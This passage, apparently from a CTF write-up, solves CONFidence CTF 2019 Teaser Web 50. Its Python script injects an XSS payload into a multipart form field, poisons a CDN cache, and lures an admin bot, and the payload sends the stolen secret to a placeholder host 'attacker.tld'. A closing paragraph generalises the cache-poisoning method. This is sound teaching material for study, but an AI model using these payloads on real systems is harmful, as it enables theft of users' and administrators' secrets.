# 3. Store self-XSS via the shoesize select attribute injection
payload = ('fetch("/profile").then(e=>e.text()).then(f=>'
           'new Image().src="//attacker.tld/?"+/secret(.*)>/.exec(f)[0])')
raw = (
  '------B\r\nContent-Disposition: form-data; name="firstname"\r\n\r\nazz\r\n'
  '------B\r\nContent-Disposition: form-data; name="shoesize"\r\n\r\n'
  f'1 tabindex=1 contenteditable autofocus onfocus={payload}\r\n'
  '------B\r\nContent-Disposition: form-data; name="secret"\r\n\r\nasd\r\n'
  '------B--\r\n'
)
s.post(f'http://target/profile/{user}', data=raw,
       headers={'Content-Type': 'multipart/form-data; boundary=----B'})

# 4. Poison the edge cache: fetch once while logged in
s.get(f'http://target/profile/{user}')

# 5. Report the profile to the admin bot -> cached (authenticated) HTML is served
#    to the admin, XSS fires, attacker.tld logs ?secret=<flag>
```

**Key insight:** CDNs cache by URL path/extension, not response `Content-Type` or `Vary: Cookie`; a `.js` (or `.css`, `.svg`, `.ico`, `.png`) suffix often flips a per-user page into a globally-shared static asset and converts a self-XSS into a wormable stored XSS. Always test whether appending common static extensions yields the *same* authenticated content from an unauthenticated fetch — that is the poisoning primitive. Admin-bot challenges behind CloudFlare are especially vulnerable; once poisoned, the next admin visit executes your payload with their cookies.

**References:** CONFidence CTF 2019 Teaser — Web 50, writeup 13925. Background: [PortSwigger: Practical Web Cache Poisoning](https://portswigger.net/blog/practical-web-cache-poisoning).
